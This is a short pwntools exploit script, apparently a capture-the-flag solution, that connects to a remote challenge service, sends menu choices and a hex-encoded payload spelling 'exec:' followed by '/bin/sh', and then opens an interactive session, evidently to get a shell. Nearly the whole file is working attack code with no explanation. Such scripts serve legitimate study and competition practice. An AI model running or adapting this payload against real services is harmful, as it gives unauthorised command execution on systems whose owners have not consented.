from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False


io = remote("kubenode.mctf.io", 30014)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


payload = b""
payload += b"\x65\x78\x65\x63\x3a"
payload += b"/bin/sh\x00"
io.sendlineafter("choice: ", b"1")
io.sendlineafter("request: ", payload)
io.sendlineafter("choice: ", b"4")
io.sendlineafter("completed: ", b"1")

io.interactive()
